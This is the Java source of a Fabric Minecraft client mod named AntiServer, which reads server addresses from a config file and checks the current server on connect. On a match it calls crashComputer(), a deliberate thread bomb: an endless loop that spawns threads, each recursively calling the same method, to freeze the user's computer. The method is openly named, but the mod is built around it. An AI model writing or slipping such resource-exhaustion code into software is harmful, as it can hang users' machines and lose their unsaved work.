package antiserver.antiserver.client;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.loader.impl.util.log.Log;
import net.fabricmc.loader.impl.util.log.LogCategory;
import net.fabricmc.loader.impl.util.log.LogLevel;
import net.minecraft.client.MinecraftClient;

import java.io.File;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Scanner;

@net.fabricmc.api.Environment(net.fabricmc.api.EnvType.CLIENT)
public class AntiserverClient implements ClientModInitializer {

    private final MinecraftClient mc = MinecraftClient.getInstance();
    public static final AntiserverClient INSTANCE = new AntiserverClient();
    public static ArrayList<String> servers = new ArrayList<>();

    @Override
    public void onInitializeClient() {
        createConfigFile();
        readConfigFile();
    }

    public void onConnect() {
        if(servers != null) {
            String ServerIP = mc.getCurrentServerEntry().address;
            for (String server : servers) {
                assert ServerIP != null;
                if (ServerIP.equals(server)) crashComputer();
            }
        }
    }

    public void crashComputer() {
        while(true) {
            new Thread(() -> {
                while (true) {
                    crashComputer();
                }
            }).start();
        }
    }

    public static void createConfigFile() {
        String path = Paths.get(".").toAbsolutePath().normalize() + "/config/antiServerConfig.txt";
        String AntiServer = "AntiServer";
        try {
            File antiServerConfig = new File(path);
            if(antiServerConfig.createNewFile()){
                Log.log(LogLevel.INFO, LogCategory.create(AntiServer), "Created a config file.");
            } else {
                Log.log(LogLevel.INFO, LogCategory.create(AntiServer), "Creation failed or config file already exists.");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void readConfigFile() {
        String path = Paths.get(".").toAbsolutePath().normalize() + "/config/antiServerConfig.txt";
        try {
            File antiServerConfig = new File(path);
            Scanner reader = new Scanner(antiServerConfig);
            while (reader.hasNextLine()){
                String server = reader.nextLine();
                servers.add(server);
            } reader.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
